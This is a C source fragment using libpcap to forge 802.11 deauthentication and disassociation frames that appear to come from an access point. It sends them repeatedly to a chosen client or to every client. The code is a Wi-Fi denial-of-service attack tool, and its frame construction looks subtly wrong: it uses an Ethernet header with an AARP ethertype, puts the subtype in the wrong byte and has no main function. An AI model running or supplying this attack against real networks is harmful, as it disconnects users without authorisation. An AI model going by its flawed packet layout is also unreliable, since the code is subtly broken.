#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pcap.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <linux/if_ether.h>
#include <netinet/ether.h>
#include <unistd.h>

#define MAX_DEAUTH_PACKETS 100
#define DEAUTH 0xC0
#define DISASSOC 0xA0

struct ieee80211_frame {
    u_int8_t i_fc[2];
    u_int8_t i_dur[2];
    u_int8_t i_addr1[ETH_ALEN];
    u_int8_t i_addr2[ETH_ALEN];
    u_int8_t i_addr3[ETH_ALEN];
    u_int8_t i_seq[2];
};

void send_control_packet(pcap_t *handle, u_char *bssid, u_char *client, u_int8_t subtype, u_int16_t reason_code) {
    struct ether_header *eth_header;
    u_char packet[256];

    memset(packet, 0, sizeof(packet));
    eth_header = (struct ether_header *) packet;

    if (client == NULL) {
        memset(eth_header->ether_dhost, 0xFF, ETH_ALEN);
    } else {
        memcpy(eth_header->ether_dhost, client, ETH_ALEN);
    }

    memcpy(eth_header->ether_shost, bssid, ETH_ALEN);
    eth_header->ether_type = htons(ETHERTYPE_AARP);

    struct ieee80211_frame *ctrl_frame = (struct ieee80211_frame *)(packet + sizeof(struct ether_header));
    memset(ctrl_frame, 0, sizeof(struct ieee80211_frame));

    memcpy(ctrl_frame->i_addr1, eth_header->ether_dhost, ETH_ALEN);
    memcpy(ctrl_frame->i_addr2, eth_header->ether_shost, ETH_ALEN);
    memcpy(ctrl_frame->i_addr3, eth_header->ether_shost, ETH_ALEN);

    ctrl_frame->i_fc[0] = 0x00;
    ctrl_frame->i_fc[1] = subtype;

    reason_code = htons(reason_code);
    memcpy(packet + sizeof(struct ether_header) + sizeof(struct ieee80211_frame), &reason_code, sizeof(reason_code));

    int packet_size = sizeof(struct ether_header) + sizeof(struct ieee80211_frame) + sizeof(reason_code);

    for (int i = 0; i < MAX_DEAUTH_PACKETS; i++) {
        if (pcap_sendpacket(handle, packet, packet_size) != 0) {
            fprintf(stderr, "Error sending packet: %s\n", pcap_geterr(handle));
        }
        usleep(100000);
    }
}
